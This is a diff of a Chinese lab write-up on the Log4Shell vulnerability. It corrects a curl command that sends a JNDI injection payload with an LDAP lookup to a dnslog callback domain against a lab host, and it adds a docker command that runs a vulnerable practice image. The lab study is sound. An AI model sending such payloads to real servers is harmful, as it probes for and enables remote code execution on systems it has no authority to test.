@@ -77,11 +77,32 @@
 
 13. 参考了同学的做法，将 `payload` 改为 `GET` 请求的方式，并绕过 GET 过滤，成功发送请求。
    ```sh
-   curl -G http://192.168.198.13:31388/hello --data-ulencode 'payload="${jndi:ldap://tq8lht.dnslog.cn}"'
+   curl -G http://192.168.198.13:31388/hello --data-urlencode 'payload="${jndi:ldap://tq8lht.dnslog.cn}"'
    ```
    <div><img src="img/8_验证漏洞可利用性.png" width=100%></div>
 
    - 同时查看 dnslog 网站，新增了两条记录，也就是说它解析了两次这个域名。
    <div><img src="img/8_dnslog记录的record.png" width=100%></div>
 
+   ```sh
+   docker run --name log4j2_exp -p 8888:8080 vulfocus/log4j2-rce-2021-12-09:latest 
+   ```
+
+
+
+   
 ## 参考资料
+
+
+https://blog.csdn.net/smilehappiness/article/details/118466378
+
+https://blog.csdn.net/weixin_41466575/article/details/105326230
+
+https://www.runoob.com/mongodb/mongodb-linux-install.html
+
+https://rasp.baidu.com/doc/install/panel.html
+
+https://www.elastic.co/guide/en/elasticsearch/reference/6.8/deb.html
+
+
+https://blog.csdn.net/weixin_44736359/article/details/107272370
